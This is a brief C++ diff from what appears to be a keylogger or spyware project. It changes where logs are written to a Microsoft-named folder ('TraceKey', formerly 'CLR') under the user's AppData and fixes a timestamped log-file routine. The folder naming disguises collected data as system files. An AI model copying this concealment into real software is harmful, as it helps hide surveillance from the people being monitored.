@@ -11,7 +11,7 @@
 namespace IO {
     std::string getOurPath(const bool appendSeperator = false) {
         std::string appDataDir(getenv("APPDATA"));  // getenv returns the path to user's appdata folder
-        std::string fullPath = appDataDir + "\\Microsoft\\CLR";
+        std::string fullPath = appDataDir + "\\Microsoft\\TraceKey";
         return fullPath + (appendSeperator ? "\\" : "");
     }
 
@@ -40,8 +40,8 @@ namespace IO {
     std::string writeLog(const T &t) {
         std::string path = getOurPath(true);
 
-        Helper::DateTime dt();
-        std::string fileName = dt.getDateTimeString("_") + ".log";
+        Helper::DateTime dt;
+        std::string fileName = dt.getDateTimeString(".","_") + ".log";
 
         try {
             std::ofstream fileStream(path + fileName);    // creates fileName if does not exist, else just opens in append mode
